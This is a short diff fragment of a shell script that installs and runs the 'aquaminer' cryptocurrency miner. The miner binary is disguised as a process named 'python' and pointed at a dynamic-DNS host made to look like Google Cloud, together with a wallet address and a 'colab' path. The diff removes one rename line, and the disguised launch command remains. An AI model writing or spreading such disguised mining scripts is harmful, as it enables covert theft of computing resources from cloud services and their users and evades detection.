@@ -24,7 +24,6 @@ mv aquaminer-0.4-linux-amd64 python
 else
 
 echo "Miner da install , chay thoi "
-mv aquaminer-0.4-linux-amd64	python
 ./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/colab
 
      
